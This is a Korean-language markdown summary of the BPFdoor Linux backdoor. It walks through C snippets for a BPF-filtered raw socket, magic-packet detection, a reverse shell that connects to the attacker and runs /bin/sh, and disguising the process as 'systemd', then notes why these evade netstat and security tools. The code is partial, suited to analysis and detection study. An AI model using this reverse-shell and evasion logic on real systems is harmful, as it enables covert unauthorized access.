
```markdown
# 🧠 BPFdoor 핵심 코드 요약

```c
#include <linux/filter.h>     // BPF 필터
#include <sys/socket.h>       // 소켓
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/prctl.h>        // 프로세스 이름 위장
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
```

---

## 1️⃣ RAW 소켓 생성 + BPF 필터 장착

```c
int sock_raw = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);  // TCP 패킷 감청용 RAW 소켓

struct sock_filter filter_code[] = {
    // BPF 명령어: 특정 IP/포트 필터링
};

struct sock_fprog bpf_program = {
    .len = sizeof(filter_code)/sizeof(struct sock_filter),
    .filter = filter_code,
};

setsockopt(sock_raw, SOL_SOCKET, SO_ATTACH_FILTER, &bpf_program, sizeof(bpf_program));  // 필터 부착
```

📌 **목적:** 커널 수준에서 특정 패킷만 감시하도록 필터링 (매직 패킷 감지)

---

## 2️⃣ 매직 패킷 수신 및 파싱

```c
char buffer[4096];
struct sockaddr_in source;
socklen_t slen = sizeof(source);

recvfrom(sock_raw, buffer, sizeof(buffer), 0, (struct sockaddr *)&source, &slen);

// IP 및 TCP 헤더 오프셋 계산 후, 매직 값 확인
if (check_magic(buffer)) {
    handle_command(&source);
}
```

📌 **목적:** 특정 패턴(매직 값)이 포함된 패킷이 오면 쉘을 띄움

---

## 3️⃣ 쉘 실행 로직

```c
int sock = socket(AF_INET, SOCK_STREAM, 0);
connect(sock, (struct sockaddr *)&target, sizeof(target));  // 공격자 연결

dup2(sock, 0);  // stdin
dup2(sock, 1);  // stdout
dup2(sock, 2);  // stderr

char *args[] = {"/bin/sh", NULL};
execve("/bin/sh", args, NULL);  // 쉘 실행
```

📌 **목적:** 리버스 셸 구현 – 공격자 명령을 받아 실행 결과를 다시 전달

---

## 4️⃣ 프로세스 위장

```c
prctl(PR_SET_NAME, "systemd", 0, 0, 0);  // 프로세스 이름 위장
```

📌 **목적:** `ps`, `top` 등에서 위장된 이름으로 표기되어 탐지 회피

---

# 🔁 전체 흐름 요약
1. RAW 소켓 생성  
2. BPF 필터로 특정 패킷 수신  
3. 매직 패킷 확인 후 공격자에게 연결 시도  
4. 입출력 리디렉션 후 `/bin/sh` 실행  
5. 프로세스 이름을 `systemd` 등으로 위장  

---

# ✅ 이 코드를 통해 알 수 있는 특징
- 포트를 열지 않기 때문에 `netstat`, `ss`로 탐지 불가  
- BPF는 커널 레벨 필터로 동작 → 보안 솔루션 탐지 우회  
- root 권한이 필요함  
- 리버스 셸이므로 공격자가 먼저 접속하지 않으면 흔적 없음
```

